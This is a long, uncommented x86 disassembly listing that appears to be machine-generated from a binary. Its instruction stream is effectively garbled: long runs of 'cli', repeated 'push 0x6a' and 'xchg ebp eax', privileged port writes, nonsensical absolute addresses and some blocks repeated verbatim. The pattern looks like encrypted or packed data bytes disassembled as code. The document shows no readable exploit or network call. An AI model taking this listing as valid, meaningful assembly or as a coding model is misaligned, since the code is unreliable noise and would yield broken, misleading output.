xchg ebp eax
xchg ebp eax
cli
cli
cli
cli
cli
xor [ ebx + 0x6a6a28bb ] eax
cli
cli
or al 0xe3
daa
lodsb [ esi ]
add [ ebx ] al
loope r-xdata
xchg ebp eax
xchg ebp eax
or [ ebp - 0x109595a7 ] 0xaa
adc [ 0xfffffffffa6a6a7d ] 0xffffff95
cld
xchg edx eax
adc [ edi ] 0x57
push 0x6a
xchg ebp eax
push ds
dec esi
sub_45f707
loope r-xdata
cli
cli
cli
cli
cli
cli
cli
cli
cli
cli
cli
cli
cli
cli
cli
cli
cli
cli
out dx al
mov edx 0x82959596
lea ebx [ ecx + 0x6a ]
push 0xffffffef
stosb [ edi ]
xchg ebp eax
cmp eax 0x639b830e
push 0x6a
cli
or al 0xe3
daa
cwde
sub ebp 0x50
push 0x6a
cli
cli
cli
cli
cli
cli
xchg ebp eax
cld
0xe36a6a6a 0x922f
loope r-xdata
xor eax [ ebx + 0x6a6a6df8 ]
cli
cli
cli
cli
cli
cli
cli
add al [ edi + 0x39846c58 ]
or [ ecx - 0x70 ] 0xffffff95
xchg ebp eax
cli
cli
cli
cli
cli
cli
add [ ebx + eax * 4 + 0x1c ] al
push 0x6a
cli
cli
loope r-xdata
adc ebx 0xffffff96
xchg ebp eax
xchg ebp eax
cli
cli
cli
cli
cli
xor [ ebx + 0x6a6a28bb ] eax
cli
cli
or al 0xe3
daa
lodsb [ esi ]
add [ ebx ] al
loope r-xdata
xchg ebp eax
xchg ebp eax
or [ ebp - 0x109595a7 ] 0xaa
adc [ 0xfffffffffa6a6a7d ] 0xffffff95
cld
xchg edx eax
adc [ edi ] 0x57
push 0x6a
xchg ebp eax
push ds
dec esi
sub_45f743
push 0xfffffffa
cli
and [ esi ] 0x6e
push 0x6a
cmp edx 0x76
push 0x6a
cli
cli
cli
cli
cli
out 0xe7 eax
out 0x97 al
xchg ebp eax
xchg ebp eax
or al 0xe3
pop ss
cld
or al 0xe3
aaa
0xe30c
sub_45f765
aas
into
sub [ esp + edi * 2 - 0x5059596 ] 0xfffffffa
cli
cmp esp 0x2c
push 0x6a
cli
cli
cli
cli
or al 0xe3
das
mov dh [ edx ]
add [ eax ] cl
and [ edx ] 0x4c
push 0x6a
cli
cli
cli
cli
cli
cli
cli
out 0x2f eax
retn 0x5183
sub_45f924
dec esi
jle r-xdata
scasb [ edi ]
push edx
out 0x2f eax
mov edx 0x5fd2833a
push 0x6a
mov [ 0xffffffff92e1faa9 ] eax
cmp esp 0x7d
push 0x6a
cli
cli
cli
cli
cli
cli
cli
cmp al 0x83
add [ ebp + edx * 4 - 0x505056b ] dl
cli
jmp 0xffffffffedab5d4d
sbb [ ebp - 0x5959591 ] 0xfffffffa
cli
cli
cli
loop r-xdata
test al 0x4a
or al 0xe3
jle r-xdata
mov esi 0xe78227e7
das
retn 0xd283
push ebp
das
push 0x6a
cli
cli
pop ecx
stosb [ edi ]
xor [ 0xfffffffffa959595 ] 0xffffffe9
sub al 0x51
0x958ae865 0x9595
xor eax 0x6a450383
push 0xfffffffa
cli
cli
cli
cli
xchg ebp eax
pop ds
sahf
xchg ebp eax
cmp eax 0x2f55831e
sub_45fafb
push 0x6a
push 0x2
push 0xffffffea
push 0x6a
add [ edx - 0x6b ] ch
push ds
dec esi
dec edx
xchg ebp eax
cmp al 0x1e
xchg ebp eax
dec esi
jle r-xdata
bound ebp [ edx + 0x6a ]
push 0x0
dec esi
jle r-xdata
xchg ebp eax
cli
cmp [ ebp + 0x6a6aeafc ] edx
push 0xffffffe3
fcom [ edx + ebp * 2 + 0x6a ]
cli
out dx eax
stosb [ edi ]
out dx al
jg r-xdata
push 0xffffff95
cld
test eax 0x3bb9ef65
push 0x6a
cmp [ ebx + 0x6a6a3bad ] eax
cli
cli
cli
cli
cli
xchg ebp eax
push ds
dec esi
jb r-xdata
aas
loope r-xdata
push 0x6a
xor [ edx ] 0x2b
push 0x6a
cli
cli
cli
cli
cli
cli
sbb [ edi ] 0x55
push 0x6a
popad
pushfd
xchg ebp eax
xchg ebp eax
jmp 0x6a486174
xchg ebp eax
push ds
dec esi
jb r-xdata
cmp edi [ ebx ]
loope r-xdata
push 0xffffff83
add edx [ edx + ebp * 2 + 0x6a ]
cli
cli
cli
cli
cli
imul ebx [ edx + 0x6a5a9683 ] 0x962fe36a
loope r-xdata
cmp al 0x1e
or [ edi ] 0x5d
push 0x6a
out dx eax
stosb [ edi ]
xor [ ebp + 0x6e ] 0x6a
push 0xfffffffa
cli
loopne r-xdata
or al 0xe3
aaa
and al 0x83
movsb [ edi ] [ esi ]
push 0x6a
push 0xfffffffa
cli
cli
cli
cli
cli
out dx eax
stosb [ edi ]
out dx al
or al 0x79
push 0x6a
sub esp 0x50
push 0x6a
cli
jecxz r-xdata
bound edi [ ecx ]
cmp al 0x83
mov esp [ ebp + 0x6a ]
dec esi
jpe r-xdata
xchg esi eax
sbb [ eax + ebp - 0x5059596 ] 0xc
jecxz r-xdata
inc ebp
xor [ ecx ] 0xffffff92
xchg ebp eax
xchg ebp eax
cli
cli
cli
cli
cli
or al 0xe3
aaa
loope r-xdata
dec esi
sub [ ecx ] 0x77
push 0x6a
cli
xchg ebp eax
xchg ebp eax
add ch [ edi ]
xchg esi eax
loope r-xdata
add [ ecx + edi * 2 - 0x5059596 ] 0xfffffffa
cli
mov [ 0xffffffffe1fafaa9 ] eax
mov dl 0xe9
xchg ecx eax
xchg ebp eax
out dx eax
test [ ecx + 0x6a ] ch
push 0x59
stosb [ edi ]
sub [ eax ] 0x2b
push 0x6a
xchg edx eax
adc [ edx - 0x6a ] 0xffffff95
xchg ebp eax
cli
cli
cli
cli
cli
cli
cli
aas
sbb [ ecx - 0x56a6a63 ] 0x39
xchg ebp eax
cld
0xe36a6a6a 0x4e2e
pop edx
iretd
das
xchg esi eax
sub [ edi ] 0x6f
push 0x6a
or edi 0xffffff95
xchg ebp eax
xchg ebp eax
cli
cli
cli
fsubr [ gs : 0x4e2e956e ]
jb r-xdata
push 0x6a
xor [ 0xfffffffffa6a6a61 ] 0xfffffffa
dec esi
jb r-xdata
push 0xffffffe1
mov ch 0xc
jecxz r-xdata
loope r-xdata
loope r-xdata
sahf
sub al 0x6a
push 0xfffffffa
pop ecx
mov eax 0x52831d00
imul ebp [ edx + 0x6a ] 0xffffff82
mov dl 0x95
loope r-xdata
cmp al [ eax ]
sbb cl ah
mov ah 0x83
jg r-xdata
push 0xffffff83
loope r-xdata
ja r-xdata
jmp 0xffffffffefab90c7
jmp 0x6b8c4a4b
sub [ edi ] 0x7c
push 0x6a
cmp [ edx + 0x3f6a6a58 ] 0xffffffe1
xchg [ 0x6a4e3983 ] bh
das
stosb [ edi ]
add al 0x3c
daa
daa
cmp [ esi - 0x5959595 ] 0xfffffffa
cmp ah [ ebp - 0x24 ]
insd
cmp ch bl
lodsd [ esi ]
mov al [ 0xffffffffe76a6a6a ]
out dx al
dec esi
0x6a68
push 0x6a
cli
cli
cli
loope r-xdata
push 0x2
push 0x7a
cmp eax 0x6a4e3983
mov edx 0x3f6a6a58
loope r-xdata
push 0xfffffffa
cli
cli
cli
cli
cli
cli
cli
cli
cli
cli
out 0x2e eax
dec esi
cli
cli
cli
cli
cli
cli
cli
cli
cli
out dx eax
push 0xfffffffa
loope r-xdata
and cl 0x2f
sahf
jecxz r-xdata
add [ eax ] bl
loope r-xdata
jb r-xdata
push 0x6a
cmp [ ebx + 0x6a6a51a7 ] eax
cli
cli
cli
cli
cli
lodsd [ esi ]
das
mov dh 0x5
sbb [ 0xffffffff8a2fad0c ] eax
push ds
dec edx
and bl [ ebp * 4 + 0xf32d22f ]
add al 0x3c
lodsd [ esi ]
das
salc
daa
daa
xor cl [ edi ]
lodsd [ esi ]
push 0x6a
add ch [ edx + 0x7a ]
xchg [ ebx + 0x6a6a40c6 ] al
cli
cli
cli
out 0xef eax
scasb [ edi ]
xchg esi eax
xchg ebp eax
xchg ebp eax
cmp dl [ ebp + 0x6a6a86fc ]
push 0xffffff83
jmp 0x3ab066c2
cli
cli
cli
cli
cli
cli
cli
cli
cli
cli
cli
jecxz r-xdata
cmp [ edi + 0x71 ] 0x6a
push 0xfffffffa
cli
cli
cli
cli
cmp al 0xe1
0x83962fe7 0x9fee
xchg ebp eax
xchg ebp eax
cli
outsb
dec esi
sbb [ ebx - 0x5959593 ] 0xffffffe3
push ss
dec esi
jpe r-xdata
sub ah [ esi - 0x1f ]
push 0xffffffe1
push 0xffffffe1
sub dh [ edx - 0x1d ]
push ss
dec esi
inc esi
imul edx [ ebp - 0x6b1ea5e7 ] 0xffffff83
push eax
push 0x6a
out dx eax
stosb [ edi ]
add [ esi - 0x1e9595aa ] 0xffffffb5
or al 0xe3
aaa
sub_45fd54
push 0x6a
push 0xffffffe7
das
inc esi
xor [ edi + 0x7a ] 0x6a
push 0xfffffffa
cli
cli
cli
cli
cli
cli
cli
xor al [ eax ]
inc esp
xor eax [ ebx + 0x6a6a65eb ]
cli
xor edi 0x75
push 0x6a
cli
xchg ebp eax
std
sub [ edx + 0x6a ] 0x6a
and [ ebp - 0x6a ] 0xffffff95
xchg ebp eax
cli
cli
lodsd [ esi ]
das
mov fs [ ecx ]
cmp al 0x27
and [ ebx + 0x6a6a4491 ] eax
cli
cli
sub [ edx - 0x6c ] 0x95
xchg ebp eax
jecxz r-xdata
xchg ebp eax
cmp [ edx ] edi
adc [ ebp - 0x166a6a68 ] 0xae
cmp [ eax ] ax
push 0x83663c95
inc ecx
insd
push 0x6a
loope r-xdata
pop esi
add cl al
int3
dec esi
out 0xeb al
xchg dl dh
push 0x6a
push 0x39
cmp al 0x3d
add [ edx ] bl
add [ esi - 0x56a6a6f ] 0xfffffffa
jecxz r-xdata
dec esi
out 0x7e ax
imul ebp ecx 0xffffff88
sub [ gs : edi ] 0x2a
push 0xfffffffa
xchg edx eax
or eax 0x7e
push 0x6a
cli
cli
cli
or al 0xe3
daa
scasb [ edi ]
loope r-xdata
push 0x6a
cli
cli
cli
cli
cli
cli
aas
out 0x6 eax
pop esp
xchg ebp eax
std
xchg esi eax
push 0x6a
push 0xffffff83
popad
push 0x6a
cli
cli
cli
xor ebp [ ecx - 0x5050506 ]
cli
cli
cli
cli
or al 0xe3
aaa
fiadd [ ebx + 0x6a6a787f ]
sub eax 0x71
push 0x6a
cli
cli
cli
cli
cli
add ch [ edx + 0x6a ]
push 0x2a
xchg ebp eax
pop ds
bound edx [ ebp - 0x4d1eadc4 ]
jmp 0xffffffffefab9422
jmp 0x7f6480
cli
cli
cli
cli
cli
cli
cli
out 0x27 eax
mov dh 0x82
arpl [ eax + 0x6a ] bx
push 0xffffffe7
out dx eax
mov [ 0x3a959597 ] al
cmp [ 0xc6a6a7f ] 0xffffffe3
das
mov ah 0x32
adc [ edx + 0x28 ] 0x6a
push 0xfffffffa
cli
cli
cli
cli
cli
cli
xchg ebp eax
push ds
dec esi
jle r-xdata
or al 0xe3
aaa
fiadd [ ebx + 0x6a6a6e59 ]
cli
sub_4602a6
push 0x6a
cmp [ ecx + ebx * 2 ] edi
mov cl 0x3d
loope r-xdata
dec esi
push 0x6a
xor [ ebx - 0x59595ae ] 0x3a
or ebp 0x50
push 0x6a
adc ecx 0x7d
out dx eax
je r-xdata
xor ecx [ ebx ]
xchg [ esi + 0x68 ] al
push 0x6a
or [ ecx + 0x67 ] 0x6a
push 0xfffffffa
pop ecx
stosb [ edi ]
test eax 0xfafafafa
out 0x17 eax
mov [ 0xffffffff95910183 ] al
xchg ebp eax
cli
cli
cli
cli
add [ 0xfffffffff03fe30c ] ch
or [ edx - 0x59595d2 ] 0xfffffffa
cli
cli
cli
cmp [ esi - 0x61 ] 0x95
xchg ebp eax
cmp ah bh
das
sahf
cmp ah bh
das
stosb [ edi ]
xor [ ecx - 0x59595a1 ] 0xfffffffa
out dx eax
xchg ebx eax
inc eax
push 0x6a
sbb [ esi + 0x73 ] 0x6a
push 0xfffffffa
cli
cli
cli
cli
cli
cli
cli
out dx eax
stosb [ edi ]
out dx eax
lea ebp [ edi ]
push 0x6a
sub [ eax - 0x5959598 ] 0xfffffffa
cli
cli
cli
xor [ ecx - 0x166a6a79 ] 0xae
sbb dx 0x5a
aaa
fadd [ ebx - 0x6a6a61fa ]
cli
cli
cli
cli
cli
cli
cli
xor al 0x31
out dx eax
stosb [ edi ]
out dx al
lodsb [ esi ]
sub [ edx + 0x6a ] ebp
out 0x27 eax
mov esi 0x82ce2fe7
sub eax [ ebp + 0x6a ]
push 0xffffff83
push ss
inc ebx
push 0x6a
cli
cli
cli
cli
cli
cli
pop ecx
stosb [ edi ]
xor al 0x83
or eax 0xfa959595
sub [ esi ] 0x59
push 0x6a
and [ eax ] 0x46
push 0x6a
cli
adc [ edi ] 0x70
push 0x6a
cli
cli
jmp r-xdata
mov dl 0x33
or al 0xe3
cli
cli
cli
cli
loope r-xdata
push 0x6a
or [ edx - 0x7d95959b ] 0xffffffde
test [ ebp - 0x63dd7c6b ] dl
xchg ebp eax
xchg ebp eax
cli
cli
cli
cli
cli
cli
cli
cli
cli
cli
cli
cli
cli
cli
cli
cli
cli
cli
cli
cli
cli
cli
cli
cli
cli
cli
pop ecx
mov [ 0x6a546483 ] eax
push 0x65
out dx eax
ror [ esi + 0x6a ] 0x1
push 0xffffff83
mov bl 0x52
push 0x6a
cli
cmp al [ ebx + 0x6a6a50cd ]
push 0x6a
cli
cli
cli
cli
cli
cli
cli
out dx al
inc edi
jns r-xdata
add [ esi - 0x5056a6b ] 0xfa
cli
aas
loope r-xdata
or al 0xe3
das
js r-xdata
push 0xffffff83
mov [ 0xfffffffffa6a6a77 ] al
cli
cli
cli
cli
cli
cli
cli
cli
loope r-xdata
xor [ ebp + edx * 4 - 0x6b ] 0xffffff95
cli
xchg ebp eax
cmp al 0x5e
cmp [ ebp - 0x55a6a9c4 ] edx
sbb [ ebx + 0x656a6a78 ] 0xffffffef
cli
ja r-xdata
cli
cli
xor al 0x31
mov [ 0xffffffffe1fafaa9 ] eax
xchg [ ebx + 0x6a6a5d22 ] al
push edx
aaa
jpe r-xdata
sar [ ebp + 0x6a ] 0x1
push 0xfffffffa
xor [ eax ] 0x52
push 0x6a
cli
cli
cli
cli
cmp al 0x83
push esp
push 0x6a
cli
cli
cli
cli
cli
loope r-xdata
cmp eax 0x830a2ce3
mov cl 0x85
xchg ebp eax
xchg ebp eax
cli
aas
cmp [ ecx ] 0x52
push 0x6a
push 0xffffff83

push 0x6a
jmp r-xdata
popfd
xchg ebp eax
xchg ebp eax
jmp 0x24c97f42
dec esi
adc [ eax + edx * 4 - 0x6b ] 0xffffff95
jecxz r-xdata
cli
cli
cli
cli
cli
cli
cli
cli
cli
cli
cli
loope r-xdata
sahf
push 0x6a
push 0xffffff83
xchg edx eax
jge r-xdata
cli
xchg ebp eax
sbb [ edx ] ebp
or [ edi + 0xc6a6a69 ] 0xffffffe3
aaa
xor cl ah
mov ch 0xc
jecxz r-xdata
push 0xfffffffa
cli
cli
cli
cmp ah cl
das
bound ebp [ ebp + 0x8199e2f ]
add ecx [ edi ]
adc [ edi ] 0xffffff95
xchg ebp eax
xchg ebp eax
cli
mov [ 0xfffffffffafafaa9 ] eax
cli
cli
cli
cli
cli
add [ ecx ] bh
xchg edx eax
xor [ eax - 0x6f ] 0xffffff95
xchg ebp eax
cli
cli
jmp 0x3c7f0ee4
stosd [ edi ]
mov dh 0x31
add [ ecx ] cl
or al 0xe3
aaa
mov ah 0x83
and ch [ edx + ebp * 2 + 0x6a ]
sub [ edi + 0x2f ] 0x6a
push 0x51
das
out dx al
xchg [ ecx + 0x6a ] esi
push 0xffffff95
das
xchg esi eax
loope r-xdata
push 0x6a
push ecx
jmp 0xffffffffefab9a9e
xchg ebp eax
cli
cli
and [ edx - 0x7c9595b3 ] 0x3a
fwait
xchg ebp eax
xchg ebp eax
loope r-xdata
and [ ecx - 0x5959585 ] 0xfffffffa
cli
cli
cli
cmp al [ ebx - 0x6a6a6941 ]
cli
cli
cli
or [ ebx - 0x7c ] 0xffffff95
xchg esi eax
push ecx
das
xchg edx eax
call 0xffffffff95db89d6
add ebx 0x61
push 0x6a
cli
cli
cli
cli
out dx eax
stosb [ edi ]
[ edi ]
sub_460554
push 0x6a
push 0xffffff83
rcr [ ebp + 0x3a959595 ] cl
dec esi
out dx eax
stosb [ edi ]
out dx al
dec edx
cli
cli
cli
cli
adc [ esi - 0x5959588 ] 0xfffffffa
cli
cli
cli
cmp ah 0x9f
xchg ebp eax
xchg ebp eax
add dh [ ecx ]
pop ds
push 0x6a
add [ esi ] ch
out 0x2f eax
das
bound eax [ ebx - 0x6a6a6a21 ]
cli
cli
add [ esi ] dh
and [ 0xfffffffffa6a6a69 ] 0xfffffffa
cmp eax 0x82262ce3
loop r-xdata
xchg edi eax
xchg ebp eax
xchg ebp eax
cmp [ 0xffffffffef6a6a75 ] 0xffffffaa
out dx al
jg r-xdata
or al 0xe3
daa
cli
cli
cli
or al 0xe3
daa
sahf
xor eax [ eax ]
adc cl [ ebx ]
daa
pushfd
loope r-xdata
and eax 0xfa6a6a69
cli
xchg ebp eax
xchg ebp eax
loope r-xdata
jl r-xdata
or al 0xe3
daa
xchg esi eax
add [ ecx + ebp * 2 ] 0x6a
push 0xfffffffa
cli
cli
loope r-xdata
jecxz r-xdata
add cl [ esi ]
in al dx
cdq
pop ds
cmp eax 0x832234e3
sbb [ ebp - 0x5056a6b ] ebx
cli
cli
cli
cmp eax 0x6afaece3
push 0x6a
sub [ eax - 0x59595b2 ] 0x0
pop ecx
xchg ebp eax
out 0x2e eax
dec esi
cmp eax 0x49a4833a
push 0x6a
cli
jmp 0xffffffffb1c978f4
xchg esi eax
jmp 0x42c9848e
retn 0x8339
push 0x0
out 0x2f eax
loopne r-xdata
push 0x6a
xchg edx eax
xor ecx [ ebx ]
daa
nop
add [ eax ] cl
loope r-xdata
sub_46080a
push 0x6a
push 0x3
stosb [ edi ]
out dx al
push 0x6a
push 0x69
in al dx
stosb [ edi ]
push 0x6a
push 0xffffffe7
out 0x92 eax
xchg edi eax
xchg ebp eax
xchg ebp eax
sub [ esi ] 0x4a
push 0x6a
cli
push ecx
test eax 0x51bcee65
push 0x6a
and esp 0x6b
push 0x6a
cli
cli
cli
cli
cli
cli
cli
out 0x2e eax
dec esi
jpe r-xdata
adc [ ecx - 0x1e95959a ] 0x2f
xchg esi eax
sub al [ ebx + 0x6a6a40d0 ]
xchg ebp eax
cmp al 0x62
add [ ebx - 0x7a ] 0xffffff95
xchg ebp eax
cli
add ch [ edx + 0x39da108f ]
jecxz r-xdata
cmp [ ebx ] 0xffffff9a
xchg ebp eax
xchg ebp eax
push ebx
push ss
dec esi
dec edx
or [ eax + ebp * 2 + 0x6a ] 0x6a
out 0x2f eax
cmp al [ cs : ebx + 0x6a6a521f ]
cli
cli
cli
cli
cli
cli
cli
out 0x2f eax
retn 0x3382
xchg [ ebp - 0x55fd056b ] dl
cmpsb [ esi ] [ edi ]
push 0x6a
push 0xffffff82
popfd
cwde
xchg ebp eax
xchg ebp eax
xor [ ebx + 0x6e ] 0x6a
push 0xfffffffa
cli
cli
cli
xchg ebp eax
cld
sub_460912
test al 0xe7
xor ch [ eax + 0x1 ]
stosb [ edi ]
outsd
add [ ecx + 0x596eac6f ] esi
add ah cl
aaa
xchg esi eax
loope r-xdata
cli
out 0xef eax
0x9597
imul edi [ ebx + 0x615a36e3 ] 0x65bb510c
out dx eax
xchg ecx eax
inc edx
push 0x6a
sbb [ eax - 0x7a ] 0xffffff95
xchg ebp eax
out 0xef eax
adc dl [ edi + 0x3a399595 ]
and [ edi + 0x59959592 ] 0xffffffa3
or al 0xe3
daa
xchg esp eax
xor eax [ eax ]
push cs
or al 0xe3
daa
mov edx 0xc1d0033
jecxz r-xdata
test eax 0xfafafafa
mov eax 0xc1e0033
jecxz r-xdata
cli
cli
cmp al 0x95
cmp eax 0x5755833a
push 0x6a
cli
cli
cli
cli
mov esi 0x959f8f83
xchg ebp eax
push ecx
0x814ce865 0x9595
or bl 0x60
push 0x6a
loope r-xdata
cli
cli
cli
and ebx 0xffffff9c
xchg ebp eax
xchg ebp eax
cli
cli
cli
cli
xor [ ebx - 0x5050557 ] esp
cli
sub_46099c
xchg ebp eax
cmp bh [ ecx ]
xchg ebp eax
cmp eax 0x91af8326
xchg ebp eax
xchg ebp eax
cli
cli
cli
cli
xchg ebp eax
pop esp
xchg ebp eax
std
sahf
push 0x6a
push 0xffffffa9
cli
pop ecx
stosb [ edi ]
adc [ eax - 0x59595a5 ] 0xfffffffa
cli
cli
shl [ ebx ] cl
cmp ch [ edx + 0x6a ]
or al 0xe3
sub al 0x62
loope r-xdata
scasb [ edi ]
add [ edx - 0x7d ] bh
inc esp
jno r-xdata
jpe r-xdata
adc ecx 0xffffff9b
xchg ebp eax
push 0xfffffffa
cli
cli
cli
cli
cli
cli
cli
cli
jecxz r-xdata
sbb ecx [ ebx + 0x6a ]
push 0x3f
sub eax 0x77
push 0x6a
cli
add bh [ edi + 0x3d480e25 ]
jecxz r-xdata
xchg ebp eax
cld
mov ch [ edx + 0x6a ]
push 0xffffffe1
aas
bound eax [ ebx + 0x6a6a79de ]
cli
cli
cli
cli
cli
cli
cli
loope r-xdata
sub [ ecx + 0x40 ] 0x6a
push 0xfffffffa
cli
cli
and [ ecx ] 0x59
push 0x6a
cli
loope r-xdata
xchg ebp eax
cli
out dx al
cmpsb [ esi ] [ edi ]
xchg [ ebp + 0x4eeee795 ] edx
push 0x78836a6a
push ebp
push 0x6a
cli
cli
cli
cli
add [ 0xffffffffb027e30c ] cl
xor eax [ ebx + 0x6a6a7335 ]
cli
cli
cli
or al 0xad
das
xchg ebx eax
xchg ebp eax
mov edx 0x959637e3
cmp al 0x6e
loope r-xdata
push esi
and [ ecx + ebp * 2 - 0x109a9596 ] 0xffffff98
xchg ebp eax
cli
cli
cli
cli
xor [ ebx - 0x5050557 ] esp
cli
mov edx 0xc1d0033
jecxz r-xdata
cli
cli
cli
cli
cli
cli
cli
cli
cli
cli
cli
add bl 0x79
push 0x6a
out dx eax
stosb [ edi ]
out dx eax
inc edi
pop edi
push 0x6a
cmp [ ebx + edx * 4 - 0x6b ] 0xffffff95
cli
cli
cli
cli
cli
cli
cli
cli
out dx al
arpl [ ecx + 0x6a ] bx
push 0xffffff83
imul eax [ eax + 0x6a ] 0xfafafa6a
push edx
sbb bl 0x9b
xchg ebp eax
xchg ebp eax
and [ ebx ] 0x6a
push 0xfffffffa
cli
cli
cli
out 0x2f eax
0xf8833a39 0x6a60
lahf
xchg ebp eax
xchg ebp eax
sbb ebp 0x5b
push 0x6a
and ah 0x80
xchg ebp eax
xchg ebp eax
out dx eax
cwde
or al 0xe3
aaa
into
or edi 0x65
push 0x6a
cli
cli
cli
cli
cli
cli
cli
test eax 0xfafafafa
mov eax 0xc1e0033
jecxz r-xdata
cli
cli
cmp al 0x95
cmp eax 0x5755833a
push 0x6a
cli
cli
cli
cli
cli
out 0xef eax
0x9597
mov esi 0x959f8f83
xchg ebp eax
push ecx
0x814ce865 0x9595
or bl 0x60
push 0x6a
loope r-xdata
cli
and ebx 0xffffff9c
xchg ebp eax
sub_460c7e
sub [ esi ] ecx
cmp cl [ ecx ]
sub [ ebx + eax * 4 + 0x36 ] eax
xchg ebp eax
xchg ebp eax
xchg ebp eax
cli
cli
cmp ah bh
out dx al
dec esi
push 0x6a
push 0x3a
sub [ edx + 0x5a ] 0x6a
push 0xffffffe9
scasb [ edi ]
out dx ax
stosb [ edi ]
out dx al
int3
sub_460ca2
push edx
push 0x6a
sub [ edi ] 0x6e
push 0x6a
cli
cli
cli
cli
cli
cli
cli
pop ecx
mov [ 0x659592e9 ] eax
[ ebx + 0x6a458183 ]
sub_460d6d
cmp al [ ebx + 0x6a6a4c05 ]
cli
cli
cli
cli
cli
cli
cli
cli
cli
cmp ah cl
lodsb [ esi ]
bound edi [ edx ]
adc [ edi - 0x56a6a65 ] 0xfffffffa
cli
cli
cmp ah bh
out dx eax
mov esi 0x83959597
dec edx
lahf
xchg ebp eax
xchg ebp eax
cli
cmp eax 0xe3393d3d
pop ss
xchg esi eax
xchg ebp eax
cmp al 0x6
cmp eax 0xe77a17e1
das
xchg esi eax
cmp bh [ 0xffffffff83661f95 ]
cwde
ja r-xdata
and [ edi + 0x6e ] 0x6a
push 0xfffffffa
cli
cli
cli
cli
cli
cli
cli
cli
or al 0xe3
das
xchg [ ebx - 0x6a6a6457 ] al
cli
cli
cli
out dx al
pushad
push 0x6a
push 0x59
xchg ebp eax
cmp [ 0x6ac6fc95 ] ebp
push 0x6a
cmp ebx 0xffffff90
xchg ebp eax
xchg ebp eax
cli
cli
cli
cli
cli
cmp eax 0x2a3c9539
xor [ ecx + 0x7b ] 0x6a
push 0xfffffffa
xchg ebp eax
pop ds
mov fs bx
aaa
mov dh 0x83
scasb [ edi ]
inc edx
push 0x6a
or al 0xe3
das
cwde
xor cl [ ebx ]
das
sahf
add [ edi ] cl
xor al [ ebx - 0x6a6a738a ]
cli
cli
loope r-xdata
sub eax 0x6ac6fc95
push 0xfffffffa
cli
jmp 0x28c973fb
sbb [ ebx ] 0x5c
push 0x6a
xor eax [ ebx + 0x6a6a52f5 ]
loope r-xdata
stosd [ edi ]
test [ eax + 0x69 ] ebp
movsd [ edi ] [ esi ]
aam 0x50
imul esp [ ebp + 0x6a667883 ] 0x6ed0836a
push 0x6a
adc esi 0x4b
push 0x6a
cli
cli
cli
cli
cli
sub ah [ ebx + 0x1c833fa9 ]
push edi
push 0x6a
cli
mov [ 0x68ee65a9 ] eax
push ecx
push 0x6a
xor [ 0x596a6a6c ] 0xffffffa3
xor esi 0x46
push 0x6a
cli
cli
cli
imul ebx [ edx - 0x6a691f7d ] 0x2882fa95
inc esp
push 0x6a
xor esi [ ebx ]
xor eax 0x95846a83
xchg ebp eax
add [ edx + 0x6fa3016f ] ebp
adc [ ebp - 0x5959597 ] 0xfffffffa
cli
cli
fsubr [ gs : ecx ]
push edx
cmp ah [ ebp - 0x24 ]
sub [ edx + edi - 0x6b ] esi
sbb [ edx ] esi
loope r-xdata
cmp eax 0x95844182
xchg ebp eax
jmp 0x2f298916
sub_460e68
dec esi
dec edx
out dx eax
stosb [ edi ]
out dx al
lodsb [ esi ]
inc esp
push 0x6a
out 0x21 eax
and bh [ ebx ]
loope r-xdata
nop
xor al [ edx + 0x6a6a6b22 ]
xor eax [ ebx - 0x6a6a619a ]
cli
loope r-xdata
pop ecx
stosb [ edi ]
sub [ 0xfffffffffa6a6a73 ] 0xfffffffa
cli
cli
cli
push ebx
dec esi
jle r-xdata
adc [ edx + 0x5d ] 0x6a
push 0xfffffffa
cli
add ch [ edx + 0x6b ]
push 0x6a
add [ edx + 0x3c ] ch
or [ ecx - 0x166a6a75 ] 0xae
or [ edx + 0x74 ] 0x6a
push 0xfffffffa
cli
cli
cli
or al 0xe3
pop ss
add [ eax ] 0x7
test [ ebp + 0x6faa0195 ] dl
add [ ebx + 0x6995836f ] esp
push 0x6a
cli
cli
xchg ebp eax
xchg ebp eax
cli
out 0x2e eax
dec esi
dec esi
cmp ah [ ebp - 0x23 ]
insd
xor [ edi ] 0xffffff83
xchg ebp eax
xchg ebp eax
cli
cli
cli
cli
cli
cli
xor [ ecx ] 0x62
push 0x6a
cli
cli
cli
cli
cli
pop ecx
xchg ebp eax
or al 0xe3
aas
sub ah cl
mov dl 0x83
add [ esi - 0x5056a6b ] 0xfa
out dx al
mov edx 0xe96a6a76
push ss
dec esi
jle r-xdata
or [ ecx - 0x5959591 ] 0xfffffffa
cli
cli
cli
cli
add ah [ edx + 0x68 ]
push 0x6a
xor edi 0xffffff90
cli
out dx al
inc esp
push 0x6a
add dh dl
push eax
push 0x6a
and ecx 0x44
cli
cli
fsubr [ gs : ecx ]
push edx
cmp ah [ ebp - 0x24 ]
sub [ edx + edi - 0x6b ] esi
sbb [ edx ] esi
loope r-xdata
sub ah [ ebx + 0x1c833fa9 ]
push edi
push 0x6a
cli
mov [ 0x68ee65a9 ] eax
push ecx
push 0x6a
xor [ 0x596a6a6c ] 0xffffffa3
xor esi 0x46
push 0x6a
cli
cli
cli
imul ebx [ edx - 0x6a691f7d ] 0x2882fa95
inc esp
push 0x6a
xor esi [ ebx ]
xor eax 0x95846a83
xchg ebp eax
add [ edx + 0x6fa3016f ] ebp
adc [ ebp - 0x5959597 ] 0xfffffffa
cmp eax 0x95844182
xchg ebp eax
jmp 0x2f298916
cli
jecxz r-xdata
xor [ eax + ebp * 2 + 0x3afa6a6a ] 0xffffff95
pop ds
cli
cli
xor [ ebx ] ecx
aaa
0x83311f00 0x4e56
push 0x6a
cli
add [ edx + 0x33 ] bl
adc [ edx + 0x67 ] 0x6a
push 0x3f
loope r-xdata
jecxz r-xdata
push 0xffffffe9
push ss
dec esi
jbe r-xdata
fisubr [ edx + 0x6a ]
push 0xffffff82
xchg [ fs : ebp - 0x21131c6b ] dl
push 0x6a
push 0xffffffe9
scasb [ edi ]
push edx
out 0x2f eax
xchg [ edx ] bh
lodsd [ esi ]
das
xchg [ ecx ] bl
add cl [ edi ]
push es
lodsd [ esi ]
das
0x6a585906 0xb995
loope r-xdata
cli
cli
out 0x2f eax
mov edx 0xb61f953a
add [ ebx ] 0x7a
push 0x6a
cli
cmp al 0xe1
fwait
out dx eax
pushfd
out dx al
nop
insd
push 0x6a
pop ecx
mov [ 0x6f92832b ] eax
push 0x6a
cli
cli
cli
pop eax
push 0xffffff95
mov ecx 0xb1efb2e1
out dx al
dec esi
jle r-xdata
push 0xffffff83
loope r-xdata
inc edx
xchg edi eax
xchg ebp eax
xchg ebp eax
xor [ eax - 0x56a6a6e ] 0xfffffffa
out dx eax
mov cl 0x65
out dx al
